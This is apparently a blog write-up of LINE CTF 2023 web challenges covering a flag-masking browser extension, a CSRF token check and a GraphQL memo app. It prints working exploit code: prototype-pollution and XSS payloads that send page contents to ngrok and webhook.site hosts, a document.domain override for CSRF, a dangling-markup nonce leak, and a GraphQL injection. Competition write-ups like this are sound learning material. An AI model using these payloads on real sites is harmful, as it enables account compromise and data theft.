---
title: LINE CTF 2023 Notes
catalog: true
date: 2023-03-27 09:10:44
tags: [Security]
categories: [Security]
photos: /img/linectf-2023-writeup/cover-en.png
---

This year, Water Paddler got second place, solving 8 out of 9 web challenges (I contributed to 2 of them). Overall, I think the web challenges were easier than last year, and there were fewer participants.

Recently, I noticed that I haven't been writing as many writeups as before. One reason is that I've been busy, and the other reason is that there haven't been as many interesting challenges (client-side) lately. Or maybe my teammates have become stronger, and they solve the challenges before I even get a chance to look at them. So, I've been too lazy to write notes XD

In this post, I'll only write about the challenges that I participated in or found interesting. I'll skip the others.

<!-- more -->

## Flag Masker (9 solves)

The backend code for this challenge was simple. It allowed you to create a note, and the output was secure, with no risk of XSS.

The interesting part was that an admin bot had an extension that had obfuscated code, but fortunately, it was short. Here's the `worker.js` code:

``` js
(() => {
  "use strict";
  (() => {
    console.log("Flag Master - worker script is loaded.");
    var e = function(e, n) {
      return n.replace(e, (function(e, r, a) {
        n = n.replace(new RegExp(r, "g"), "*".repeat(r.length)), n += "\x3c!--DETECTED FLAGS ARE MASKED BY EXTENSION--\x3e"
      })), n
    };
    chrome.runtime.onMessage.addListener((function(n, r, a) {
      var t = n.regex ? new RegExp(n.regex, "g") : new RegExp("LINECTF\\{(.+)\\}", "g");
      ! function(e, n) {
        var r = n.head,
          a = n.body;
        return e.test(r + a)
      }(t, n) ? a({
        head: null,
        body: null,
        flag: !1
      }): a({
        head: e(t, n.head),
        body: e(t, n.body),
        flag: !0
      })
    }))
  })()
})();
```

After receiving a message, it replaces the content on the screen based on the received regular expression and then sends it back.

Here's the `content.js` code:

``` js
(() => {
  var t = {
      576: (t, r, e) => {
        var a, n;
        void 0 === (n = "function" == typeof(a = function() {
          var t = {
              a: "href",
              img: "src",
              form: "action",
              base: "href",
              script: "src",
              iframe: "src",
              link: "href",
              embed: "src",
              object: "data"
            },
            r = ["source", "protocol", "authority", "userInfo", "user", "password", "host", "port", "relative", "path", "directory", "file", "query", "fragment"],
            e = {
              anchor: "fragment"
            },
            a = {
              strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
              loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@]*):?([^:@]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
            },
            n = /^[0-9]+$/;

          function o(t, e) {
            for (var n = decodeURI(t), o = a[e ? "strict" : "loose"].exec(n), i = {
                attr: {},
                param: {},
                seg: {}
              }, s = 14; s--;) i.attr[r[s]] = o[s] || "";
            return i.param.query = f(i.attr.query), i.param.fragment = f(i.attr.fragment), i.seg.path = i.attr.path.replace(/^\/+|\/+$/g, "").split("/"), i.seg.fragment = i.attr.fragment.replace(/^\/+|\/+$/g, "").split("/"), i.attr.base = i.attr.host ? (i.attr.protocol ? i.attr.protocol + "://" + i.attr.host : i.attr.host) + (i.attr.port ? ":" + i.attr.port : "") : "", i
          }

          function i(t, r) {
            if (0 === t[r].length) return t[r] = {};
            var e = {};
            for (var a in t[r]) e[a] = t[r][a];
            return t[r] = e, e
          }

          function s(t, r, e, a) {
            var o = t.shift();
            if (o) {
              var u = r[e] = r[e] || [];
              "]" == o ? c(u) ? "" !== a && u.push(a) : "object" == typeof u ? u[function(t) {
                var r = [];
                for (var e in t) t.hasOwnProperty(e) && r.push(e);
                return r
              }(u).length] = a : u = r[e] = [r[e], a] : ~o.indexOf("]") ? (o = o.substr(0, o.length - 1), !n.test(o) && c(u) && (u = i(r, e)), s(t, u, o, a)) : (!n.test(o) && c(u) && (u = i(r, e)), s(t, u, o, a))
            } else c(r[e]) ? r[e].push(a) : "object" == typeof r[e] || void 0 === r[e] ? r[e] = a : r[e] = [r[e], a]
          }

          function u(t, r, e) {
            if (~r.indexOf("]")) s(r.split("["), t, "base", e);
            else {
              if (!n.test(r) && c(t.base)) {
                var a = {};
                for (var o in t.base) a[o] = t.base[o];
                t.base = a
              }
              "" !== r && function(t, r, e) {
                var a = t[r];
                void 0 === a ? t[r] = e : c(a) ? a.push(e) : t[r] = [a, e]
              }(t.base, r, e)
            }
            return t
          }

          function f(t) {
            return function(t, r) {
              for (var e = 0, a = t.length >> 0, n = arguments[2]; e < a;) e in t && (n = r.call(void 0, n, t[e], e, t)), ++e;
              return n
            }(String(t).split(/&|;/), (function(t, r) {
              try {
                r = decodeURIComponent(r.replace(/\+/g, " "))
              } catch (t) {}
              var e = r.indexOf("="),
                a = function(t) {
                  for (var r, e, a = t.length, n = 0; n < a; ++n)
                    if ("]" == (e = t[n]) && (r = !1), "[" == e && (r = !0), "=" == e && !r) return n
                }(r),
                n = r.substr(0, a || e),
                o = r.substr(a || e, r.length);
              return o = o.substr(o.indexOf("=") + 1, o.length), "" === n && (n = r, o = ""), u(t, n, o)
            }), {
              base: {}
            }).base
          }

          function c(t) {
            return "[object Array]" === Object.prototype.toString.call(t)
          }

          function d(t, r) {
            return 1 === arguments.length && !0 === t && (r = !0, t = void 0), r = r || !1, {
              data: o(t = t || window.location.toString(), r),
              attr: function(t) {
                return void 0 !== (t = e[t] || t) ? this.data.attr[t] : this.data.attr
              },
              param: function(t) {
                return void 0 !== t ? this.data.param.query[t] : this.data.param.query
              },
              fparam: function(t) {
                return void 0 !== t ? this.data.param.fragment[t] : this.data.param.fragment
              },
              segment: function(t) {
                return void 0 === t ? this.data.seg.path : (t = t < 0 ? this.data.seg.path.length + t : t - 1, this.data.seg.path[t])
              },
              fsegment: function(t) {
                return void 0 === t ? this.data.seg.fragment : (t = t < 0 ? this.data.seg.fragment.length + t : t - 1, this.data.seg.fragment[t])
              }
            }
          }
          return d.jQuery = function(r) {
            null != r && (r.fn.url = function(e) {
              var a, n, o = "";
              return this.length && (o = r(this).attr((a = this[0], void 0 !== (n = a.tagName) ? t[n.toLowerCase()] : n)) || ""), d(o, e)
            }, r.url = d)
          }, d.jQuery(window.jQuery), d
        }) ? a.call(r, e, r, t) : a) || (t.exports = n)
      },
      144: function(t, r, e) {
        "use strict";
        var a = this && this.__importDefault || function(t) {
          return t && t.__esModule ? t : {
            default: t
          }
        };
        Object.defineProperty(r, "__esModule", {
          value: !0
        });
        var n, o, i = a(e(576));
        console.log("Flag Masker - content script is loaded."), n = (0, i.default)(location.href), o = {}, localStorage.config ? o = JSON.parse(localStorage.config) : fetch("/config").then((function(t) {
          return t.json()
        })).then((function(t) {
          localStorage.setItem("config", JSON.stringify(t)), o = t
        })), chrome.runtime.sendMessage({
          regex: o.regex,
          head: window.document.head.innerHTML,
          body: window.document.body.innerHTML
        }).then((function(t) {
          t.flag && (window.document.head.innerHTML = t.head, window.document.body.innerHTML = t.body, fetch(n.data.attr.path + "/alert", {
            referrerPolicy: "unsafe-url"
          }))
        }))
      }
    },
    r = {};
  ! function e(a) {
    var n = r[a];
    if (void 0 !== n) return n.exports;
    var o = r[a] = {
      exports: {}
    };
    return t[a].call(o.exports, o, o.exports, e), o.exports
  }(144)
})();
```

This code is a bit longer, but it basically reads the config first, then sends the content of the body and head to the worker to replace. After replacing, it puts the content back on the screen and reports the matching content to the location `n.data.attr.path + /alert`.

If you search for the long code above, you'll find that it comes from the [Purl](https://github.com/allmarkedup/purl) library, which has been abandoned for a long time. Apart from having a prototype pollution problem, it also has many vulnerabilities in parsing URLs.

First, let's talk about prototype pollution. We can control the `localStorage.config` property by polluting the config, and pass in the regular expression we want. I initially thought of creating a ReDos or something similar and then detecting the time, but later I found out that `n.data.attr.path` can also be controlled.

For example, the path of the URL `http://web:8000/#@acabc//8cae-ip.ngrok.io` will be parsed as `//8cae-ip.ngrok.io`, so we can send the request to our server.

Combined with the config mentioned earlier, we can know which regular expression has a match.

``` html
<script>
  const domain = '8cae.ngrok.io'
  const base = 'http://' + domain
  function getUrl(flag) {
    return `http://web:8000/#@acabc//${domain}/${flag}?q[__proto__][config]={"regex":"${flag}"}`
  }

  function report(msg) {
    fetch(base + '?msg=' + msg)
  }

  function visit(str) {
    var w = window.open(getUrl(str))
    setTimeout(() => {
      w.close()
    }, 2000)
  }

  let flag = 'LINECTF{'
  const charset = '0123456789abcdef'
  const sleep = ms => new Promise(r => setTimeout(r, ms))
  async function main() {

    for(let i=0; i<32; i++) {
      for(let c of charset) {
        const str = flag + ".".repeat(i) + c
        visit(str)
        await sleep(100)
      }
    }
  }

  main()
  

</script>
```

Apart from this solution, another more powerful one is to directly create an XSS using the original functionality. The structure of each note is as follows:

``` html
<li>
  <div class="rotate-1 yellow-bg">
    <p>{content}</p>
  </div>
</li>
```

Suppose I create two notes. The first one has the content `" id=a x="`, and the second one has `LINECTF{rotate-1 yellow-bg"}`.

The HTML content will become:

``` html
<li>
  <div class="rotate-1 yellow-bg">
    <p>" id=a x="</p>
  </div>
</li>
<li>
  <div class="rotate-1 yellow-bg">
    <p>LINECTF{rotate-1 yellow-bg"}</p>
  </div>
</li>
```

Actually, `"` will also be encoded on the backend, so if you look at the source, you'll see `&#34;`. But if you use `document.body.innerHTML`, the browser may not encode it, so you'll see double quotes instead of `&#34;`. So, the encoding of double quotes doesn't work.

Then, the extension intervenes and replaces `rotate-1 yellow-bg"` with something like `***`, resulting in:

``` html
<li>
  <div class="xxx>
    <p>" id=a x="</p>
  </div>
</li>
<li>
  <div class="xxx>
    <p>LINECTF{xxx}</p>
  </div>
</li>
```

Adjusting the new structure a bit:

``` html
<li>
  <div class="xxx><p>" id=a x="</p></div></li><li><div class=" xxx>
    <p>LINECTF{xxx}</p>
  </div>
</li>
```

The first double quote is replaced, combined with the double quote at the beginning of the original content, and the `x="` at the end is combined with the next one. The `id=a` in the middle becomes part of the attribute.

In other words, we can insert any attribute into the div and use the focus function to create an XSS. Here's the payload that Renwa gave me in Discord:

```
note 1:
"tabindex="1"onfocus="eval(window.name)"style="position:relative;height: 20000px; width: 20008px;"autofocus="1"id="jj"x="

note 2:
LINECTF{rotate-1 yellow-bg"}

Report:
@domain.wtf/0ff.html

Contents of 0ff.html:
<!DOCTYPE html>
<html>
<body>
<img src=http://httpstat.us/200?sleep=5000>
<script>
var x= window.open('http://web:3000/8be526fd-e193-436c-a431-84141a0903b9','fetch(`http://web:8000/`,{credentials: "same-origin"}).then(x=>x.text()).then(x=>fetch(`https://webhook.site/603ab026-5a65-432f-a894-5d981fd24198?flag=${btoa(x)}`))');
setTimeout(function(){
x.location='http://web:8000/8be526fd-e193-436c-a431-84141a0903b9#jj'
},500)

</script>


</html>
```

I didn't think of this solution at the time. It's really amazing.

## Another Secure Store Note (7 solves)

This challenge had a feature to change the name, and the name would be directly reflected on the screen, creating a free XSS. However, the problem was that changing the name required checking the CSRF token. There was a file called `getSettings.js` that had the CSRF token:

``` js
function isInWindowContext() {
  const tmp = self;
  self = 1; // magic
  const res = (this !== self);
  self = tmp;
  return res;
}

// Ensure it is in window context with correct domain only :)
// Setting up variables and UI
if (isInWindowContext() && document.domain === '<%= domain %>') {
  const urlParams = new URLSearchParams(location.search);
  try { document.getElementById('error').innerText = urlParams.get('error'); } catch (e) {}
  try { document.getElementById('message').innerText = urlParams.get('message'); } catch (e) {}
  try { document.getElementById('_csrf').value = '<%= csrf %>'; } catch (e) {}
}
```

Here, it checks whether it is in the window context and `document.domain`. When I saw this, I immediately thought of the Intigriti XSS challenge in October 2022. The author's writeup is here: https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md

One part of the challenge uses a web worker to bypass the check on `window.location.href` and `document.domain`, like this:

``` js
// worker.js

window = {}
window.location = {}
document = {}

// send the secret to top window!
window.saveSecret = function(msg){  
  self.postMessage(msg)  
}

window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
document.domain = "challenge-1022.intigriti.io";

// we can use importScripts function from API to import external scripts!
importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
```

So this challenge specifically checks the context to try to block this, but fortunately when I was researching Intigriti, I found that `document.domain` can actually be overridden using `Object.defineProperty`, so CSRF can be done like this:

``` html
<script>
  Object.defineProperty(document, 'domain', {
    value: '35.200.57.143'
  })
</script>
<input id="_csrf" />
<script src="https://35.200.57.143:11004/getSettings.js"></script>
<form id=f method=POST action="https://35.200.57.143:11004/profile" target="_blank">
  <input name="name" value="poc">
  <input name="csrf" value="">
</form>

<script>
  const csrf = _csrf.value
  f.csrf.value = csrf
  f.submit()
</script>
```

Next is to steal the nonce. This challenge uses Firefox, and it doesn't seem to have much protection against Dangling Markup Injection, which can be used to steal the following content using meta redirect: `<meta http-equiv=refresh content='0; url=http://43d1-ip.ngrok.io/steal?q=`

The final step is to prevent the loading of `csp.gif`, because if this is loaded, the nonce will change. I spent an hour and a half trying to figure out how to block it, and originally thought that the previously mentioned concurrent limit could be used to prevent it, but no matter how I tried, it didn't work.

Finally, I found that the original `base-uri` was `self`, so the base could be used, wasting an hour QQ

## Momomomomemomemo (3 solves)

This challenge was solved by my teammate and is quite interesting. Basically, the frontend will use GraphQL to fetch results based on the id you provide:

``` js
memo(id) {
    const query = `query { 
        memo (
            id: "${id}", 
            token: "${this.token}") {
                content
            } 
        }`;
    return this.#query(query);
}
```

In the final query part, [persisted queries](https://www.apollographql.com/docs/apollo-server/performance/apq/) are used. Basically, you send the hash of the query first, and if it has been executed before, the result will be sent back directly.

Otherwise, if it hasn't, you send the hash + query again, and the backend caches the result. The frontend implementation is like this:

``` js
async #query(query) {
    const hash = await this.#getQueryHash(query);
    const res = await fetch(
        this.endpoint +
            "?" +
            new URLSearchParams({
                extensions: JSON.stringify({
                    persistedQuery: { version: 1, sha256Hash: hash },
                }),
            }),
        {
            headers: { "Content-type": "application/json" },
        }
    );
    const data = await res.clone().json();
    if (data.errors) {
        if (data.errors[0].extensions.code == "PERSISTED_QUERY_NOT_FOUND") {
            return await fetch(this.endpoint, {
                method: "POST",
                headers: { "Content-type": "application/json" },
                body: JSON.stringify({
                    query,
                    extensions: {
                        persistedQuery: {
                            version: 1,
                            sha256Hash: hash,
                        },
                    },
                }),
            });
        }
    }
    return res;
}
```

The frontend also uses the Purl library, so there is also prototype pollution that can be used, but what can be polluted in this challenge? The answer is in this section:

``` js
const purl = window.purl

const memoId = purl().param('id')

const gql = new GraphQL(location.origin)

class GraphQL {
    constructor(host, option = {}) {
        this.endpoint = host + "/";
        this.endpoint += option.path || "graphql";
    }
    // ...
}
```

You can pollute the path, which can manipulate `option.path`, but what can be done with this? This is related to the backend's i18n logic, implemented as follows:

``` js
// simple i18n
app.use(function (req, res, next) {
    let origPath = req.originalUrl.split('?')[0]
    let origParam = req.originalUrl.split('?')[1]
    let langPath = 'en/'
    
  
    if (origPath.match(/((\/en\/?)|(\/ja\/?))$/) || origPath.match(/^(\/static\/|\/graphql\/?|\/favicon.ico\/?)/)) {
      next()
    } else {
      if (req.headers['accept-language'] && req.headers['accept-language'].split(',')[0] === 'ja') langPath = 'ja/'
      res.redirect(origPath + (origPath.endsWith('/') ? '' : '/') + langPath + (origParam ? '?' + origParam : ''))
    }
  })
```

Note that `req.originalUrl` will only have the path part, so if it's like http://chall:11005/abc, the originalUrl will be `/abc`.

With the path manipulated above, we can pollute the path to `/huli.tw/`, so the sent URL will be: `http://34.85.126.119:11005//huli.tw/?extensions=...`, and in the backend's redirect logic, it will finally be redirected to `//huli.tw/en/?extension=...`.

This way, by using prototype pollution, the request can be redirected to our own server and the query string can be obtained.

The goal of this challenge is to steal the admin's memo, but we don't know the admin memo id. What should we do?

Take a closer look at this section:

``` js
memo(id) {
    const query = `query { 
        memo (
            id: "${id}", 
            token: "${this.token}") {
                content
            } 
        }`;
    return this.#query(query);
}
```

We can carefully construct an id to achieve GraphQL injection, like this:

``` js
query { 
  memo (
    id: "a", token: "b"
  ) { content }

  memo2: memos(
    token: "${this.token}") {
        content
    } 
}
```

This turns into two queries. The original memo token becomes the memos token, allowing access to all admin notes.

Therefore, the final solution is to send this modified query once to let the server store the result, then add prototype pollution to redirect the request to our server. This way, we can find out the hash and obtain the result.
